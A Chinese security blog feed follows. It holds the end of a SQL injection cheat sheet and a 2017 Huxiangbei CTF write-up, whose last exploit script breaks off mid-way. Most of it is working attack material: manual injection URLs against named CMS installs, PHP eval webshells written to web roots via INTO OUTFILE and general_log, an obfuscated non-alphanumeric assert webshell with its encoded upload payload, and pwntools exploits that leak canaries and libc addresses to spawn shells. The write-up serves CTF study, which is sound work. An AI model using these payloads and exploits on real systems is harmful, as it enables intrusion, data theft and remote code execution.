extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1) 获取数据库表1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select database()))),1)%23&amp;num=1 获取数据库表中的列1http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()))),1)%23&amp;num=1 获取数据库表中列字段的值12http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=0x75736572))),1)%23&amp;num=1或者http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0 procedure analyse (extractvalue(rand(),concat(0x3a,(select concat(username,0x3a,password) from user limit 2,1))),1)%23&amp;num=1 基于约束的 SQL 攻击也就是二次注入的原理因为 sql 的 select 是不忽视最大长度的限制的而 insert 是有最大长度的限制的，超过长度限制就会发生截断。所以可以利用 insert 插入一个任意用户名加（N个空格，一般64个）然后用 select 选择出来，select 默认是选择第一条数据，所以存在一个任意用户登录的漏洞 access手工注入判断是否注入点1输入 http://192.168.1.7:800/shownews.asp?id=178 and 1=1 网页正常 1输入 http://192.168.1.7:800/shownews.asp?id=178 and 1=2 网页不正常 猜解表 access 只能通过猜测获得表和字段1http://192.168.1.7:800/shownews.asp?id=178 and exists (select * from admin) 页面正常 说明存在 admin 这个表 猜解列1输入http://192.168.1.7:800/shownews.asp?id=178 and exists (select username from admin) 网页正常 说明存在 username 这个列 通过 order by 判断长度1输入http://192.168.1.7:800/shownews.asp?id=178 order by 10 网页正常，说明大于等于10 12输入http://192.168.1.7:800/shownews.asp?id=178 order by 11 网页不正常，说明小于11所以应该为10 Union查询 查显错点1输入http://192.168.1.7:800/shownews.asp?id=178 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin 爆出 admin 表的数据1输入http://192.168.1.7:800/shownews.asp?id=178 and 1=2 union select 1,username,3,4,5,6,7,8,9,10 from admin 用同样的方法步骤可以得出 password 表的数据sqlserver 手工注入获取当前数据库1http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and db_name()&gt;0;-- 获取第一个表1http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.sysobjects where xtype=0x75);-- 得到第一个表 eims_CasePro 通过已得到的表获取其他的表1http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.sysobjects where xtype=0x75 and name not in('eims_CasePro'));-- 得到表eims_CaseSort 1http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.sysobjects where xtype=0x75 and name not in ('eims_CasePro','eims_CaseSort'));-- 得到表 eims_Down 其他表的获得方式一样 获取列1http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.syscolumns where id=(select id from Test_EIMS.dbo.sysobjects where xtype='U' and name='eims_User'));-- 得到列 ItemID 1http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49 and 0&lt;(select top 1 name from Test_EIMS.dbo.syscolumns where id=(select id from Test_EIMS.dbo.sysobjects where xtype='U' and name='eims_User') and name not in ('ItemID'));-- 得到列 SortID 获取值1http://192.168.1.108:800/eims_cms_3.5/News.asp?SortID=1&amp;ItemID=49and 1&lt;(select top 1 admin_name%2b&apos;:&apos;%2badmin_pass from Test_EIMS.dbo.admin_User);-- 得到值admin:admin mysql 写入木马取得注入漏洞，手工注入一句话木马1http://192.168.1.108/510cms/510cms/news.php?cid=&amp;listid=&amp;newsid=33 and 1=2 union select 1,2,'&lt;?php eval([$_POST[1])?&gt;',4 into outfile 'c:\\wwwroot\\510cms\\510cms\\admin\\zks.php' 穿山甲利用filewriter写入 sqlmap 生成注入点 –os-shell1sqlmap. -u "http://192.168.1.108/510cms/510cms/news.php?cid=&amp;listid=&amp;newsid=24" --os-shell 1生成上传点：http://192.168.1.108:80/510cms/tmpuxsbx.php 上传 php 一句话木马连接菜刀 拿到 phpmysdmin 后台后如何拿到w ebshell在 my.ini 或者 mysql.cnf 对文件导入导出进行限制限制 mysqld 不允许导入 | 导出1mysqld --secure_file_prive=null 限制 mysqld 的导入 | 导出 只能发生在 /tmp/ 目录下1mysqld --secure_file_priv="/tmp/" 不对 mysqld 的导入 | 导出做限制1mysqld --secure_file_priv="/" 不对 mysqld 的导入 | 导出做限制直接写入一句话1select '&lt;php eval($_POST[1]);?&gt;' into outfile '/tmp/html/www/1.php'; 对 mysqld 的导入 | 导出做限制先查看 secure_file_priv 设置的路径12SELECT @@global.secure_file_priv;SHOW VARIABLES LIKE "secure_file_priv" 修改 secure_file_priv 设置的路径1set global secure_file_priv='C:/php/WWW/'; 查看 general_log_file 的路径并修改至网站根目录123SHOW VARIABLES LIKE "%general%"SET global general_log_file='C:/php/WWW/1.php'set global general_log='on' 写入一句话木马1select '&lt;?php @eval($_POST[3123]);?&gt;' 菜刀连接 1.php 即可查看mysql关键路径123show grants for ''@'%'; 查看 mysql 用户的权限select @@datadir; 查询读取数据库路径select @@basedir; 查询 MYSQL 安装路径 sql 注入防护0）、采用 sql 语句预编译和绑定变量，是防御 sql 注入的最佳方法1）、mysql_real_escape_string() 函数来转义特殊的输入字符2）、addcslashes() 函数在指定的字符前添加反斜杠]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017湖湘杯]]></title>
    <url>%2F2017%2F12%2F15%2F2017%E6%B9%96%E6%B9%98%E6%9D%AF%2F</url>
    <content type="text"><![CDATA[2017湖湘杯网络安全大赛Writeup 复赛为web渗透，反编译，破解，加密&amp;解密 一共15道题。 Misc100 热身运动64 个棋盘格子，每一帧都有不同的头像在一个格子里面，想到六十四进制和 Base64 编码。将头像的格子换成数字，再对应 Base64 编码，最后解密得到 flag 12325,38,49,33,25,55,44,49,29,5,60,49,13,21,61,38,29,22,57,46,30,23,52ZmxhZ3sxdF8xNV9mdW5ueX0=flag&#123;1t_15_funny&#125; Misc150 流量分析WireShark 打开 pcap 直接导出 flag.zip 打开后是 ce.txt 是 RGB 值，写脚本解出 flag 123456789101112131415161718192021from PIL import Imageimport rex = 887 y = 111 im = Image.new('RGB',(x,y))#rgb1 = [****]m=0file = open('ce.txt')for i in xrange(0,x): for j in xrange(0,y): #line = rgb1[(3*m):(3*(m+1))] m+=1 rgb = c = file.readline().split(",") im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))im.show()im.save("flag.png") Misc200 Encryptor.apk分析定位到 EncryptImageActivity 类，可以看到加密函数。 异或加密，在重复操作，就是把 flag 丢进去再加密一次，拉出结果文件。 根据这个将加密后的文件进行解密就可以，还有就是那个 key 是字符 Password 的 md5例如 bash d56a23，key 就是 bash key=[0xd5,0x6a,0x23] 这样分割。 Misc300原题 RE100 Re4newer查壳发现有 UPX upx -d 文件名脱掉之后 IDA 分析定位主函数进行逆向，sub_401080 可以看到，这里可以分成44个两位16进制的数，并且顺序与箭头所指的数的大小有关。 pyhon脚本如下： 123456a = [0x45,0x43,0x4E,0x44,0x13,0x4A,0x76,0x59,0x71,0x4B,0x7D,0x51,0x54,0x7D,0x63,0x7D,0x7D,0x5B,0x50,0x11,0x52,0x4F,0x4B,0x51,0x70,0x7D,0x47,0x4E,0x67,0x67,0x70,0x70,0x7D,0x57,0x7D,0x67,0x71,0x51,0x63,0x52,0x5F,0x56,0x13,0x7D]flag = ''for i in range(11): for j in [3,2,1,0]: flag += chr( a[i*4+j]^0x22)print(flag) RE200 简单的 android将apk格式改成zip解压出来 使用d2x2jar反汇编拿到源码 使用工具jd-gui查看源码 直接拿到flag。 RE400pyc 分析XDCTF 原题 12345678910111213141516171819202122232425262728def tobin(b): ret='' for i in [128,64,32,16,8,4,2,1]: ret+='1' if b&amp;i else '0' return retdef decode3b(s): a=s&gt;&gt;16 b=(s&gt;&gt;8) &amp; 0xFF c=s &amp; 0xff sa=tobin(a) sb=tobin(b) sc=tobin(c) return table[int(sa[2:],2)]+table[int(sb[4:]+sa[:2],2)]+table[int(sc[6:]+sb[:4],2)]+table[int(sc[:6],2)] &gt;&gt;&gt; a=open('flag.enc','rb')&gt;&gt;&gt; a=a.read()&gt;&gt;&gt; s=''&gt;&gt;&gt; for i in xrange(0, len(a), 3):... s+=decode3b(int(a[i:i+3].encode('hex'), 16))...&gt;&gt;&gt; s'yedugr1ofbm2o4epQz8i1op2tpkxft1nf344t000000000000000'&gt;&gt;&gt; s=''.join(map(lambda c: table[(table.index(c)+63)%64], s))'xdctfq0neal1n3doPy7h0no1sojwes0me233s"""""""""""""""' xdctf&#123;0ne-l1n3d_Py7h0n_1s_@wes0me233&#125; Web150 random访问 .index.php.swp 得到源码。 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(0);$flag = "*********************";echo "please input a rand_num !";function create_password($pw_length = 10)&#123; $randpwd = ""; for ($i = 0; $i &lt; $pw_length; $i++)&#123; $randpwd .= chr(mt_rand(100, 200)); &#125; return $randpwd;&#125;session_start();mt_srand(time());$pwd=create_password();echo $pwd.'||'; if($pwd == $_GET['pwd'])&#123; echo "first"; if($_SESSION['userLogin']==$_GET['login']) echo "Nice , you get the flag it is ".$flag ;&#125;else&#123; echo "Wrong!";&#125;$_SESSION['userLogin']=create_password(32).rand();?&gt; 是按照时间戳那生成的密码，所以快速的再提交一边密码就好了。 12345678910#coding=utf-8import sysimport urllibreload(sys)sys.setdefaultencoding("utf-8")import requestspwd = requests.get('http://114.215.138.89:10080').content[-18:-8]print pwdans1 = requests.get('http://114.215.138.89:10080?pwd='+urllib.quote(pwd)).contentprint ans1 Web200简简单单的上传，没有套路。 文件包含漏洞，直接使用 php://filter 读取 flag.php 即可获得 Base64 编码过后的 flag base64解码得到 flag。 $flag=”flag{c420fb4054e91944a71ff68f7079b9424e5cba21}”; Web300过滤了字母、数字和一些符号，需要上传一个 webshell 找到 p 牛的文章，提到了一种利用类型转换的 webshell 1234567891011121314151617181920212223242526272829303132333435&lt;?php$_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); 根据本题的 waf，还是需要绕过一下，@ 用来屏蔽错误，可以去掉，不影响功能。用来获取 Array 字符串的双引号可以采用 $_=’’.[]; 来绕过。 最后可以绕过本题 waf 的 webshell 1&lt;?php $_=''.[];$_=$_['_'=='__'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); 编码后即可成功上传 webshell 最终 payload 123http://114.215.133.202:10080/index.php?content=%24_%3D%27%27.%5B%5D%3B%24_%3D%24_%5B%27_%27%3D%3D%27__%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24__%2b%2b%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B&lt;?php $flag="=hxb2017&#123;51f759f39ac1f0cd5509b299b1d908f7&#125;"; ?&gt; PWN100把 pwns100 直接拖入 ida 中：main函数： base64 解码函数 输入函数 可以看到 read 可以输入的字符串可以长达 0x200 个，这里可造成缓冲区溢出漏洞这个程序很简单，输入 base64 字符串输出 base64 解码之后的字符串先运行一下程序看一下这个程序干了啥： 再看看程序开启了哪些保护： 因为这个程序开了 Canary，这个题目的要利用 printf 泄露这个程序中的 Canary，然后再泄露 libc 的基地址，最后利用溢出重新布置栈空间 getshell。因为每次 fork,子进程复制父进程的数据空间(数据段)、栈和堆，父、子进程共享正文段。也就是说，对于程序中的数据，子进程要复制一份，但是对于指令，子进程并不复制而是和父进程共享，具体可参考https://www.cnblogs.com/bwangel23/p/4190043.html 这个文章，所以虽然在泄露 Canary 或者 libc 的时候使子进程崩溃了，但是不会影响父进程的稳定性。所以我的 exp 是： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#!/usr/bin/env python# -*- coding: utf-8 -*-__Auther__ = 'niexinming'from pwn import *import base64context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')def debug(addr = '0x08048B09'): raw_input('debug:') gdb.attach(io, "b *" + addr)local_MAGIC = 0x0003AC69io = process('/home/h11p/hackme/huxiangbei/pwns')#io = remote('104.224.169.128', 18887)#debug()#getCanarypayload = 'a'*0x102io.recvuntil('May be I can know if you give me some data[Y/N]\n')io.sendline('Y')io.recvuntil('Give me some datas:\n')io.send(base64.b64encode(payload))io.recvline()myCanary=io.recv()[268:271]Canary="\x00"+myCanaryprint "Canary:"+hex(u32(Canary))#getlibc#debug()payload = 'a'*0x151io.recvuntil('May be I can know if you give me some data[Y/N]\n')io.sendline('Y')io.recvuntil('Give me some datas:\n')io.send(base64.b64encode(payload))io.recvline()mylibc=io.recv()[347:351]base_libc=u32(mylibc)-0x18637print "mylibc_addr:"+hex(base_libc)#pwn#debug()MAGIC_addr=local_MAGIC+base_libcpayload = 'a'*0x101+Canary+"a"*0xc+p32(MAGIC_addr)io.recvuntil('May be I can know if you give me some data[Y/N]\n')io.sendline('Y')io.recvuntil('Give me some datas:\n')io.send(base64.b64encode(payload))io.interactive()io.close() 讲解一下如何获取 Canary，因为输入的输入数据会被 printf 输出，遇到 0x00 的时候停止输出，如果输入的输入刚刚好覆盖到 Canary 前面就可以用 printf 输出 Canary 了，但是 Canary 后两位是 0x00,所以得到输出之后要补足后两位的 0x00 同理也可以用这种方法计算出__libc_start_main 和 libc 的基地址 计算出 Canary 的值和基地址后，就可以通过溢出让程序程序跳转到 MAGIC 去了，就可以 getshell 了，至于 MAGIC 是啥，大家可以翻一下这篇文章：http://blog.csdn.net/niexinming/article/details/78512274最后的效果是： PWN 200把 pwns200 直接拖入 ida 中：main 函数： sub_80485CD 函数： 在 sub_80485CD 函数可以看到输入的数据直接进入了 printf 函数中，所以这个肯定是一个格式化字符串漏洞先运行一下程序看一下这个程序干了啥 再看看程序开启了哪些保护: 这个程序开了 Canary 和栈不可执行这个题目的思路和http://blog.csdn.net/niexinming/article/details/78512274 差不多，唯一不同的是上一个题目提供了 system 函数，这个题目要从 libc 中找 system 函数，所以首先通过 printf 打印__libc_start_main 函数这个地址，然后根据偏移计算 libc 的基地址，然后计算出 system 的实际地址，最后用 fmtstr_payload(autofmt.offset, {atoi_got_addr: system_addr}) 把 atio 的地址覆盖为 system 的地址，就可以 getshell 了。 我的exp是： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *def debug(addr = '0x0804867E'): raw_input('debug:') gdb.attach(r, "b *" + addr)def base_addr(prog_addr,offset): return eval(prog_addr)-offset#localsystem = 0x0003ADA0context(arch='i386', os='linux', log_level='debug')r = process('/home/h11p/hackme/huxiangbei/pwne')#r = remote('hackme.inndy.tw', 7711)elf = ELF('/home/h11p/hackme/huxiangbei/pwne')libc=ELF('/lib/i386-linux-gnu/libc.so.6')def exec_fmt(payload): r.recvuntil('WANT PLAY[Y/N]\n') r.sendline('Y') r.recvuntil('GET YOUR NAME:\n') r.recvuntil('\n') r.sendline(payload) info = r.recv().splitlines()[1] print "info:"+info r.sendline('10') #r.close() return infoautofmt = FmtStr(exec_fmt)r.close()r = process('/home/h11p/hackme/huxiangbei/pwne')atoi_got_addr = elf.got['atoi']print "%x" % atoi_got_addrsystem_offset_addr = libc.symbols['system']print "%x" % system_offset_addrpayload1="%35$p"#debug()r.recvuntil('WANT PLAY[Y/N]\n')r.sendline('Y')r.recvuntil('GET YOUR NAME:\n')r.recvuntil('\n')r.sendline(payload1)libc_start_main = r.recv().splitlines()[1]libc_module=base_addr(libc_start_main,0x18637)system_addr=libc_module+system_offset_addrprint "system_addr:"+hex(system_addr)r.sendline('10')payload2 = fmtstr_payload(autofmt.offset, &#123;atoi_got_addr: system_addr&#125;)r.recvuntil('WANT PLAY[Y/N]\n')r.sendline('Y')r.recvuntil('GET YOUR NAME:\n')r.recvuntil('\n')r.sendline(payload2)r.recv()#r.sendline('10')r.sendline('/bin/sh')r.interactive()r.close() 效果是： PWN 300把 pwn300 直接拖入 ida 中：main 函数： add 函数： 这个题目很有意思，首先开辟一个3到255大小的堆空间，然后做加减乘除的计算之后把计算结果放入堆中，最后可以把所有的计算结果用 memcpy 函数全部放入函数的临时变量 v5 中也就是栈中，这样就会造成栈溢出。先运行一下程序看一下这个程序干了啥： 再看看程序开启了哪些保护: 看到这个程序开了栈不可执行，于是肯定就会想到用 rop 来做这个题目用 ida 打开之后发现有很多函数，所以判断这个题目是静态编译 所以可以用 http://blog.csdn.net/niexinming/article/details/78259866 中我提到的 ROPgadget 工具来做，不出意外，很成功的找了完整的 rop 链 这个题目还有个难点就是不能直接输入十六进制，所以根据http://blog.csdn.net/niexinming/article/details/78666941 我的这篇文件可以用 ctypes.c_int32(0x123).value 进行转换所以我的 exp 是： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#!/usr/bin/env python# -*- coding: utf-8 -*-__Auther__ = 'niexinming'from pwn import *import binasciiimport ctypes as ctfrom struct import packcontext(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')def debug(addr = '0x08048ff5'): raw_input('debug:') gdb.attach(io, "b *" + addr)def base_addr(prog_addr,offset): return eval(prog_addr)-offsetelf = ELF('/home/h11p/hackme/huxiangbei/pwn300')io = process('/home/h11p/hackme/huxiangbei/pwn300')p=[]p.append( 0x0806ed0a) # pop edx ; retp.append( 0x080ea060) # @ .datap.append( 0x080bb406) # pop eax ; retp.append(eval('0x'+binascii.b2a_hex('nib/')))p.append( 0x080a1dad) # mov dword ptr [edx], eax ; retp.append( 0x0806ed0a) # pop edx ; retp.append( 0x080ea064) # @ .data + 4p.append( 0x080bb406) # pop eax ; retp.append(eval('0x'+binascii.b2a_hex('hs//')))p.append(0x080a1dad) # mov dword ptr [edx], eax ; retp.append(0x0806ed0a) # pop edx ; retp.append(0x080ea068) # @ .data + 8p.append(0x08054730) # xor eax, eax ; retp.append(0x080a1dad) # mov dword ptr [edx], eax ; retp.append(0x080481c9) # pop ebx ; retp.append(0x080ea060) # @ .datap.append(0x0806ed31) # pop ecx ; pop ebx ; retp.append(0x080ea068) # @ .data + 8p.append(0x080ea060) # padding without overwrite ebxp.append(0x0806ed0a) # pop edx ; retp.append(0x080ea068) # @ .data + 8p.append(0x08054730) # xor eax, eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x0807b75f) # inc eax ; retp.append(0x08049781) # int 0x80tempnum=0#debug()io.recvuntil('How many times do you want to calculate:')io.sendline('255')for i in xrange(0,16): io.recvuntil('5 Save the result\n') io.sendline('1') io.recvuntil('input the integer x:') io.sendline(str(tempnum)) io.recvuntil('input the integer y:') io.sendline('0')for j in p: io.recvuntil('5 Save the result\n') io.sendline('1') io.recvuntil('input the integer x:') io.sendline(str(ct.c_int32(j).value)) io.recvuntil('input the integer y:') io.sendline('0')io.recvuntil('5 Save the result\n')io.sendline('5')io.interactive()io.close() 注意一点就是，就是程序在 return 0之前会调用 free，而为了保证 free 函数的正常运行，前十六次计算的结果必须为0，后面的计算结果就可以随意了。最后 getshell 的效果是： PWN 400把pwn 400 直接拖入 ida 中：main 函数： Create Profile 函数： Print Profile 函数： Update Profile 函数： Exchange 函数： 这个题目有点难度，题目的流程不难，首先创建 Profile，当名字的长度小于8的时候会把数据写入 bss 段，数据的长度值 nbytes 会放入数据的后面，大于8的时候会 malloc 一个空间，把输入写入堆中，而指针会保存在 bss 段，而数据的长度值 nbytes 也会保存在指针的后面，更新 Profile 的时候也会做相同的操作，打印数据的时候会把名字输出，可以用这个功能泄露程序任意地址的任意数据，Exchange 可以交换两个地址的数据，可以利用这个来 getshell 先运行一下程序看一下这个程序干了啥： 再看看程序开启了哪些保护： 看到这个程序开了栈不可执行，于是肯定就会想到用 rop 来做。 这个程序有两个地方可以利用：（1）是创建的 Profile，名字长度如果小于8就把数据写入 bss 段中，但是你可以输入负数，如果是负数的话，就可以造成整数溢出，你就可以在bss段中写入任意长度的数据，就可以覆盖后面的长度值 nbytes 为任意数值，这样你可以伪造一个任意长度的数据，在 print 函数中可以看到如果 nbytes 长度小于8就去读 bss 中的数据，如果 nbytes 大于8就会去读 bss 中的指针指向的数据，如果我们伪造 nbytes 的话就可以让 print Profile 函数去读任意地址的数据，通过 got 表可以计算出 libc 的基地址（2）是 Exchange 函数可以交换任意两个指针，但是两个指针都是要有写权限的，程序中权限可以通过 vmmap 来查看 这个地方是难点，解决方法是：用 top_chunk 指针和 read@got 指针进行交换，第二次堆分配时候可以分配到我想要的位置，就可以把想要数据写入 read@got 中，当下回调用 read 的时候就可以跳到 MAGIC 中 getshell 了，关于 top_chunk 的介绍可以参考https://www.cnblogs.com/alisecurity/p/5486458.html我的 exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#!/usr/bin/env python# -*- coding: utf-8 -*-__Auther__ = 'niexinming'from pwn import *import binasciicontext(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')localMAGIC=0x5fbc6localmain_arena=0x001B2780def debug(addr = '0x08048BA6'): raw_input('debug:') gdb.attach(io, "b *" + addr)def base_addr(prog_addr,sysmbol,offset): if sysmbol=='min': return eval(prog_addr)-offset else: return eval(prog_addr) + offsetdef cr_up_profile(choose,name_len,name,age): io.recvuntil('&gt;') io.send(choose) io.recv() io.sendline(name_len) io.recvuntil('Input your name:\n') io.sendline(name) io.recvuntil('Input your age:\n') io.sendline(age)def print_profile(address): io.recvuntil("&gt;") io.sendline('2') data = io.recv().splitlines()[0][11:15][::-1] log.info("%#x =&gt; %s" % (address, (data or '').encode('hex'))) return datadef change_age(address1,address2): io.sendline('4') io.recvuntil('Person 1:') io.send(p32(address1)) io.recvuntil('Person 2:') io.send(p32(address2))def leak(address): payload = p32(address) + 'a' * 4 + p32(10) cr_up_profile('3','-10',payload,'10') return print_profile(address)def getshell(address1,address2,address3): change_age(address1,address2) cr_up_profile('3','20',address3,'20')#libc addrlibc=ELF('/lib/i386-linux-gnu/libc.so.6')symbols = ['environ', '_environ', '__environ']for symbol in symbols: environ = libc.symbols[symbol]print "environ:"+hex(environ)head=libc.symbols['__curbrk']print "head:"+hex(head)system=libc.symbols['system']print "system:"+hex(system)__malloc_hook=libc.got['__malloc_hook']print "__malloc_hook:"+hex(__malloc_hook)#profile addrelf = ELF('/home/h11p/hackme/huxiangbei/profile')printf_addr=elf.got['printf']puts_addr=elf.got['puts']atoi_addr=elf.got['atoi']malloc_addr=elf.got['malloc']__isoc99_scanf_addr=elf.got['__isoc99_scanf']read_addr=elf.got['read']print "printf_addr:"+hex(printf_addr)print "puts_addr:"+hex(puts_addr)print "atoi_addr:"+hex(atoi_addr)print "malloc_addr:"+hex(malloc_addr)print "__isoc99_scanf_addr:"+hex(__isoc99_scanf_addr)print "read_addr:"+hex(read_addr)io = process('/home/h11p/hackme/huxiangbei/profile')#debug()#create 